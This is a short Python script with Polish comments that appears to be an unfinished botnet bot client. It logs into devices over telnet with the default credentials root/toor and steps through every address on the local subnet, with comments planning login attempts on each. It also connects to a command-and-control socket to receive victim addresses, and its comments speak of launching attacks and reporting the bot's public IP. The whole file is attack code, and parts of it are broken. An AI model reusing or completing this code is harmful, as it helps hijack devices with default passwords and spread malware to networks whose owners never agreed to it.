import socket
import time
import xtelnet

from requests import get


def telnetConnect(ip_address):
    t = xtelnet.session()
    # można zrobić pętlę do wczytywania user credentials z pliku
    t.connect(ip_address, username='root', password='toor', p=23, timeout=5)
    output1 = t.execute('echo success')
    print(output1)
    t.close()


def checkForOtherDevices(ip):
    x = 0
    i = 0
    l = len(ip)
    while x < l:
        if ip[x] == '.':
            i = x
        x += 1
    x = 0
    g = ip.split('.')[-1]
    ip = ip[:l - len(g)]

    while x < 254:
        current_address = ip + str(x)
        # telnetConnect(current_address)
        x += 1
        print(current_address)
        # próbuj połączyć z każdym przez telnet używając pliku z loginem i hasłem


if __name__ == '__main__':

    HOST = '127.0.0.1'  # The server's hostname or IP address
    PORT = 65432  # The port used by the server

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        flag = 0
        while True:

            while flag != 1:
                time.sleep(0.5)
                try:
                    s.connect((HOST, PORT))
                    flag = 1
                except:
                    flag = 0
                    continue

            checkForOtherDevices(HOST)
            # while True: czekaj na dane
            # s.sendall(b'Beginn attack')
            data = s.recv(1024)
            if data == 1:
                victim_ip = s.recv(1024)
            if data == 2:
                HOST = s.recv(1024)
            # wyślij swój adres ip przy:
            # - każdym połączeniu
            # - po każdym ataku

            # ip = get('https://api.ipify.org').text
            # print('public IP address: {}'.format(ip))
            # print('operating port: {}'.format(PORT))

            print('Received', repr(data))
